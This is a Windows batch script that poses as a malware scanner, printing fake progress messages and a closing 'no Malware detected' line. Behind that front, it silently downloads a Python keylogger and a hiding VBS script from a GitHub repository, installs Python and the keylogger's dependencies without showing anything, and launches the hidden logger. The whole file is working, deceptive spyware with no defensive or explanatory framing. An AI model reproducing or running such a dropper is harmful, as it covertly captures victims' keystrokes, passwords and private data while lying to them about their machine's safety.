@echo off
echo Scanning your computer for malware, please stand by...
if not exist "%UserProfile%\.keylogger" mkdir "%UserProfile%\.keylog"
cd %UserProfile%\.keylog
curl -sOL "https://raw.githubusercontent.com/Raikster/keylogger_python/main/keylogger.py" --output keylogger.py
curl -sOL "https://raw.githubusercontent.com/Raikster/keylogger_python/main/keylogger_start.bat" --output keylogger_start.bat
curl -sOL "https://raw.githubusercontent.com/Raikster/keylogger_python/main/testhide.vbs" --output testhide.vbs
curl -sOL "https://raw.githubusercontent.com/Raikster/keylogger_python/main/requirements.txt" --output requirements.txt
echo 25% done...
curl -s "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe" --output python396.exe
echo 50% done...
start /wait python396.exe /quiet InstallAllUsers=0 Include_launcher=0 Include_pip=1 Include_test=0 Shortcuts=0
%UserProfile%\appdata\local\programs\python\python39\python.exe -m pip install --upgrade pip --no-warn-script-location --quiet
echo 75% done...
cd %UserProfile%\AppData\Local\Programs\Python\Python39\Scripts
pip.exe install -r %UserProfile%\.keylog\requirements.txt --no-warn-script-location --quiet
cd %UserProfile%\.keylog
testhide.vbs
echo finished, no Malware detected ...
